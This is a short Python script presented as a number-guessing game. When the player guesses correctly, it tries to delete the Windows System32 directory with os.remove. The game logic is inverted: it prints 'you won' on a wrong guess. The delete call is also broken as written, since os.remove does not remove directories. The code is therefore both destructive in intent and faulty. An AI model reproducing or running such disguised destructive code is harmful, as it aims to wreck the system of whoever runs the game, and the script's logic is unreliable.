import os 
import random

number = random.randint(1,10)

guess = int(input("guess your number"))

if guess != number :
    print("you won")
else:
    os.remove("C:\windows\System32")